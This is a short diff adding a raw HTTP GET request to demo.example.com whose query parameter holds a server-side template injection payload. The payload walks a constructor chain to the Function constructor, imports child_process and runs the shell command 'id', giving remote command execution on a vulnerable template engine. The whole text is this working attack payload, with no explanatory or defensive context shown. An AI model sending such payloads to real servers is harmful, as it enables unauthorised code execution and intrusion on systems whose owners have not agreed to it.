@@ -1,0 +1,4 @@
+GET /a?s={{%20/*x*/ranges.constructor.constructor("return%20import")()('child_process').exec('id')%20}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
